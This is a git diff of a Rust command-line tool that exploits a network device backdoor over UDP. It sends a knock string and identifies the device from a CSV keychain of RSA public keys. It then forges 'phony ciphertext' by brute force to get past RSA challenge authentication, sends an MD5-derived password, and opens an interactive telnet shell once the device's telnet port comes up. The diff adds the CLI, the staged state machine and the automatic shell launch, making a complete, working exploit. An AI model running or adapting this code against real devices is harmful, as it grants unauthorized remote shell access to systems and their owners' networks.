@@ -4,65 +4,159 @@ use openssl::pkey::{Public};
 use openssl::error::ErrorStack;
 use openssl::hash::{hash, MessageDigest};
 use rand::prelude::*;
-use std::net::{UdpSocket};
+use std::net::{UdpSocket, TcpStream};
 use csv;
 use std::collections::HashMap;
+use clap::Parser;
+use log::{info, trace, warn, error, debug};
+use env_logger;
+use std::thread::sleep;
+use telnet::Telnet;
+use std::time::{Duration};
+use std::process::{Command,Stdio};
 
 
-const ANSI_GRAY: &str = "\x1b[90m";
+
 const ANSI_RESET: &str = "\x1b[0m";
+const ANSI_GRAY: &str = "\x1b[90m";
+const ANSI_RED: &str = "\x1b[91m";
+const ANSI_GREEN: &str = "\x1b[92m";
+const ANSI_YELLOW: &str = "\x1b[93m";
+const ANSI_BLUE: &str = "\x1b[94m";
+const ANSI_MAGENTA: &str = "\x1b[95m";
+const ANSI_CYAN: &str = "\x1b[96m";
+const ANSI_WHITE: &str = "\x1b[97m";
 
 
+
+#[derive(Parser, Debug)]
 enum Protocol {
-    PROTOCOL_1,
-    PROTOCOL_2,
-    PROTOCOL_3
+    Protocol1,
+    Protocol2,
+    Protocol3
 }
 
 
+#[derive(Parser,Debug)]
+struct Cli {
+    #[clap(short, long)]
+    protocol: u8,
+    #[clap(short, long)]
+    address: String,
+    // The port should be an optional arg, default 21210
+    #[clap(short, long)]
+    backdoor_port: Option<u16>,
+    #[clap(short, long)]
+    telnet_port: Option<u16>,
+    #[clap(short, long)]
+    keychain_path: String,
+    #[clap(short, long)]
+    salt: Option<String>,
+}
 
 
+#[derive(Debug)]
+struct Context {
+    protocol: Protocol,
+    address: String,
+    port: u16,
+    telnet_port: u16,
+    e: Option<String>,
+    n: Option<String>,
+    d: Option<String>,
+    knockknock: Option<String>,
+    salt: String,
+    keychain: HashMap<String, String>,
+    stage: u8,
+    iteration: u32,
+}
 
-fn read_lookup_table_from_csv(path: &str) -> HashMap<String, String> {
+
+fn read_keychain_from_csv(path: &str) -> HashMap<String, String> {
     let mut reader = csv::Reader::from_path(path).unwrap();
-    let mut lookup_table = HashMap::new();
+    let mut keychain = HashMap::new();
     for result in reader.records() {
         let record = result.unwrap();
-        lookup_table.insert(record[2].to_string(), record[3].to_string());
+        // trim the whitespace from these fields
+        keychain.insert(record[0].trim().to_string(), record[1].trim().to_string());
     }
-    lookup_table
+    keychain
+}
+
+
+fn init_context(cli: &Cli) -> Context {
+    let keychain = read_keychain_from_csv(&cli.keychain_path);
+    info!("Keychain loaded from {}", &cli.keychain_path);
+    for (key, value) in keychain.iter() {
+        trace!("{} -> {}", key, value);
+    }
+    let protocol = match cli.protocol {
+        1 => Protocol::Protocol1,
+        2 => Protocol::Protocol2,
+        3 => Protocol::Protocol3,
+        _ => panic!("Protocol must be 1, 2 or 3"),
+    };
+    let knockknock = match protocol {
+        Protocol::Protocol1 => None,
+        Protocol::Protocol2 => None,
+        Protocol::Protocol3 => Some("ABCDEF1234".to_string()),
+    };
+    Context {
+        protocol: protocol,
+        address: cli.address.clone(),
+        port: cli.backdoor_port.unwrap_or(21210),
+        telnet_port: cli.telnet_port.unwrap_or(23),
+        e: None,
+        n: None,
+        d: None,
+        knockknock: knockknock,
+        salt: cli.salt.clone().unwrap_or("TEMP".to_string()),
+        keychain: keychain,
+        stage: 0,
+        iteration: 0,
+    }
 }
 
 
 
-fn hexdump(data: &[u8]) {
+
+fn hexdump(data: &[u8]) -> String {
+    let s = data.iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
+    format!("{}{}{}", ANSI_GRAY, s, ANSI_RESET)
+}
+
+
+fn _hexdump2(data: &[u8]) -> String {
     // print data in the same format as `hexdump -C`,
     // with ascii characters in the left margin
-    print!("{}", ANSI_GRAY);
+    let mut s = String::new();
+    s.push_str(ANSI_GRAY);
     for (i, chunk) in data.chunks(16).enumerate() {
-        print!("{:04x}  ", i * 16);
+        s.push_str(&format!("{:04x}  ", i * 16));
         for (j, byte) in chunk.iter().enumerate() {
-            print!("{:02x} ", byte);
+            s.push_str(&format!("{:02x} ", byte));
             if j == 7 {
-                print!(" ");
+                s.push_str(" ");
             }
         }
         if chunk.len() < 16 {
             for _ in 0..(16 - chunk.len()) {
-                print!("   ");
+                s.push_str("   ");
             }
         }
-        print!("|");
+        s.push_str("|");
         for byte in chunk {
             if *byte >= 0x20 && *byte <= 0x7e {
-                print!("{}", *byte as char);
+                s.push(*byte as char);
             } else {
-                print!(".");
+                s.push_str(".");
             }
         }
-        println!("|");
+        s.push_str("|");
     }
-    print!("{}", ANSI_RESET);
+    s.push_str(ANSI_RESET);
+    println!("{}", s);
+    return s
 }
 
 
@@ -90,6 +184,7 @@ fn random_bytes(buf: &mut [u8]) {
 fn find_phony_ciphertext(
     rsa: &Rsa<Public>,
     predicate: &dyn Fn(&[u8]) -> bool) -> Vec<u8> {
+    trace!("Searching for phony ciphertext with desired property...");
     let mut ciphertext = vec![0; 0x80];
     let mut plaintext = vec![0; 0x80];
     let mut tries = 0;
@@ -100,7 +195,7 @@ fn find_phony_ciphertext(
         match rsa.public_decrypt(&ciphertext, &mut plaintext, Padding::NONE) {
             Ok(_) => {
                 if predicate(&plaintext) {
-                    println!("Found phony ciphertext after {} tries", tries);
+                    trace!("Found phony ciphertext after {} tries", tries);
                     return ciphertext;
                 }
             },
@@ -111,30 +206,33 @@ fn find_phony_ciphertext(
 
 
 fn communicate(addr: &str, port: u16, data: &[u8], await_reply: bool) -> std::io::Result<Vec<u8>> {
-    let mut bindaddr;
-    let mut socket;
+    let socket;
     let mut p = port;
     loop {
         p += 1;
         if p > 65534 {
             panic!("No free port found");
         }
-        bindaddr = format!("0.0.0.0:{}", p);
-        match UdpSocket::bind(bindaddr.clone()) {
+        match UdpSocket::bind(("0.0.0.0", p)) {
             Ok(s) => {
-                println!("Bound to {}", bindaddr);
+                trace!("Bound to 0.0.0.0:{}", p);
                 socket = s;
                 break;
             },
             Err(_) => {}
         }
     }
-    println!("Sending {} bytes to {}:{}", data.len(), addr, port);
+    trace!("Sending {} bytes to {}:{}", data.len(), addr, port);
 
     socket.connect((addr, port))?;
     socket.send(data)?;
+
     let mut buf = vec![0; 0x100];
     if await_reply {
+        // wait a tiny bit
+        sleep(Duration::from_millis(10));
+        // set a timeout of 3 seconds
+        socket.set_read_timeout(Some(Duration::new(3, 0)))?;
         let len = socket.recv(&mut buf)?;
         buf.truncate(len);
         return Ok(buf); 
@@ -151,16 +249,25 @@ fn device_identifying_hash(idstr: &str) -> Vec<u8> {
 }
 
 
-fn stage1(addr: &str, port: u16, lookup: HashMap<String,String>) -> std::io::Result<String> {
-    let data = "ABCDEF1234".as_bytes();
-    let id = communicate(addr, port, &data, true)?;
+fn probe_tcp_port(addr: &str, port: u16) -> bool {
+    trace!("Checking TCP port {}:{}", addr, port);
+    TcpStream::connect((addr, port)).is_ok()
+}
 
-    // now iterate through the lookup table and find a match
-    for (idstr, pubkey) in lookup.iter() {
+
+fn stage1(ctx: &mut Context) -> std::io::Result<u8> {
+    trace!("Entering Stage 1");
+    let data = ctx.knockknock.as_ref().unwrap().as_bytes();
+    let id = communicate(&ctx.address, ctx.port, &data, true)?;
+
+    // now iterate through the keychain and find a match
+    for (idstr, pubkey) in ctx.keychain.iter() {
         let hash = device_identifying_hash(idstr);
         if hash == id {
-            println!("Found key for device: {} -> {}", idstr, pubkey);
-            return Ok(pubkey.to_string());
+            info!("Found key for device: {} -> {}", idstr, pubkey);
+            ctx.e = Some("10001".to_string());
+            ctx.n = Some(pubkey.to_string());
+            return Ok(2);
         }
     }
 
@@ -168,8 +275,14 @@ fn stage1(addr: &str, port: u16, lookup: HashMap<String,String>) -> std::io::Res
 }
 
 
-fn stage2(addr: &str, port: u16, pubkey: &str, protocol: Protocol) -> std::io::Result<Vec<u8>> {
-    let rsa = mkrsa("010001", pubkey)?;
+fn stage2(ctx: &Context) -> std::io::Result<u8> {
+    trace!("Entering Stage 2");
+    if ctx.e.is_none() || ctx.n.is_none() {
+        panic!("No public key available");
+    }
+    
+    let rsa = mkrsa(ctx.e.as_ref().unwrap(), ctx.n.as_ref().unwrap()).expect("Failed to build RSA keys.");
+    trace!("Built RSA keys");
     // use for protocols 2 and 3
     fn first_byte_printable(data: &[u8]) -> bool {
         return data[0] >= 0x20 && data[0] < 0x7f;
@@ -179,52 +292,159 @@ fn stage2(addr: &str, port: u16, pubkey: &str, protocol: Protocol) -> std::io::R
         return data[0] == 0;
     }
 
-    let predicate = match protocol {
-        Protocol::PROTOCOL_1 => first_byte_null,
-        Protocol::PROTOCOL_2 => first_byte_printable,
-        Protocol::PROTOCOL_3 => first_byte_printable
+    let predicate = match ctx.protocol {
+        Protocol::Protocol1 => first_byte_null,
+        Protocol::Protocol2 => first_byte_printable,
+        Protocol::Protocol3 => first_byte_printable
     };
 
     let ciphertext = find_phony_ciphertext(&rsa, &predicate);
-    let challenge = communicate(addr, port, &ciphertext, false);
-    // ignoring challenge, we're hacking this
-    Ok(challenge)
+    trace!("Found phony ciphertext: {}", hexdump(&ciphertext));
+    let challenge = communicate(&ctx.address, ctx.port, &ciphertext, true)?;
+    if challenge.len() != 0x80 {
+        warn!("Unexpected challenge length: {}", challenge.len());
+        match ctx.protocol {
+            Protocol::Protocol1 => return Ok(2),
+            Protocol::Protocol2 => return Ok(2),
+            Protocol::Protocol3 => return Ok(1)
+        }
+    }
+    trace!("Received challenge: {}", hexdump(&challenge));
+    Ok(3) // go to stage 3
 }
 
 
-fn stage3(addr: &str, port: u16, salt: &str) -> std::io::Result<Vec<u8>> {
-    let password = md5(format!("+{}", salt));
-    println!("Password prepared:");
-    hexdump(&password);
-    let res = communicate(addr, port, &password, true)?;
-    Ok(res)
+fn stage3(ctx: &Context) -> std::io::Result<u8> {
+    trace!("Entering Stage 3");
+    let password = md5(format!("+{}", ctx.salt).as_bytes());
+    trace!("Password prepared: {}", hexdump(&password));
+    let _res = communicate(&ctx.address, ctx.port, &password, false)?;
+    sleep(Duration::from_millis(100));
+    if probe_tcp_port(&ctx.address, ctx.telnet_port) {
+        Ok(4)
+    } else {
+        match ctx.protocol {
+            Protocol::Protocol1 => Ok(2),
+            Protocol::Protocol2 => Ok(2),
+            Protocol::Protocol3 => Ok(1)
+        }
+    }
+}
+
+
+fn _telnet(ctx: &Context) -> std::io::Result<()> {
+    let mut tel = Telnet::connect((ctx.address.as_str(), ctx.telnet_port), 256)?;
+    info!("Telnet connection established with {}:{}", ctx.address, ctx.telnet_port);
+    tel.write(b"Hello, world!\r\n")?;
+
+
+    Ok(())
+}
+
+
+fn telnet(ctx: &Context) -> std::io::Result<()> {
+    let res = Command::new("telnet")
+        .arg(ctx.address.as_str())
+        .arg(ctx.telnet_port.to_string())
+        .stdin(Stdio::inherit())
+        .stdout(Stdio::inherit())
+        .stderr(Stdio::inherit())
+        .output()?;
+    trace!("telnet process terminated: {:?}", res);
+
+    Ok(())
+}
+
+
+fn stage_colour(stage: u8) -> &'static str{
+    match stage {
+        1 => ANSI_GREEN,
+        2 => ANSI_YELLOW,
+        3 => ANSI_RED,
+        4 => ANSI_CYAN,
+        _ => panic!("Invalid stage: {}", stage)
+    }
+}
+
+fn state_machine(ctx: &mut Context) -> std::io::Result<()> {
+    ctx.stage = match ctx.protocol {
+        Protocol::Protocol1 => 2,
+        Protocol::Protocol2 => 2,
+        Protocol::Protocol3 => 1
+    };
+
+    match ctx.protocol {
+        Protocol::Protocol1 => {
+            ctx.n = Some(ctx.keychain.get("p1default").expect("No default key provided for Protocol 1").clone());
+            ctx.e = Some("10001".to_string());
+        }
+        Protocol::Protocol2 => {
+            ctx.n = Some(ctx.keychain.get("p2default").expect("No default key provided for Protocol 2").clone());
+            ctx.e = Some("10001".to_string());
+        }
+        Protocol::Protocol3 => {
+            ctx.n = None;
+            ctx.e = None;
+        }
+    }
+
+
+    loop {
+        ctx.iteration += 1;
+        info!("{}Iteration {} - Stage {}{}", stage_colour(ctx.stage), ctx.iteration, ctx.stage, ANSI_RESET);
+        match ctx.stage {
+            1 => {
+                ctx.stage = stage1(ctx)?;
+            },
+            2 => {
+                ctx.stage = stage2(ctx)?;
+            },
+            3 => {
+                ctx.stage = stage3(ctx)?;
+            },
+            4 => {
+                // Run telnet!
+                telnet(ctx)?;
+                break;
+            },
+            _ => {
+                panic!("Invalid stage: {}", ctx.stage);
+            }
+        }
+    }
+    Ok(())
 }
 
 
 fn main() {
-    let e = "10001";
-    let n = "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD724AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B388451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7AF52829E9F858691";
-    let rsa = mkrsa(e, n).unwrap();
 
-    fn first_byte_printable(data: &[u8]) -> bool {
-        return data[0] >= 0x20 && data[0] < 0x7f;
+    env_logger::init();
+    trace!("Entering main");
+
+    let cli = Cli::parse();
+    let mut ctx = init_context(&cli);
+
+    if probe_tcp_port(&ctx.address, ctx.telnet_port) {
+        warn!("Backdoor already open!");
+        sleep(Duration::from_millis(100));
+    
+        telnet(&ctx).unwrap();
+        return;
+    }
+    info!("Backdoor closed, starting exploit");
+
+    loop {
+        match state_machine(&mut ctx) {
+            Ok(_) => {
+                info!("Finished.");
+                return;
+            }
+            Err(e) => {
+                warn!("Error: {}", e);
+                sleep(Duration::from_millis(100));
+                warn!("Restarting state machine...");
+            }
+        }
     }
 
-    let lookup = read_lookup_table_from_csv("data/keychain.csv");
-    println!("Loaded {} entries from keychain.csv", lookup.len());
-    for (key, value) in lookup.iter() {
-        println!("{} -> {}", key, value);
-    }
-
-    for i in 0..10 {
-        let phony = find_phony_ciphertext(&rsa, &first_byte_printable);
-        hexdump(&phony);
-        let mut plain = vec![0; 0x80];
-        rsa.public_decrypt(&phony, &mut plain, Padding::NONE).unwrap();
-        println!("Plaintext:");
-        hexdump(&plain);
-        let resp = communicate("127.0.0.1", 21210, &phony, true).unwrap();
-        println!("Response:");
-        hexdump(&resp);
-    }
 }
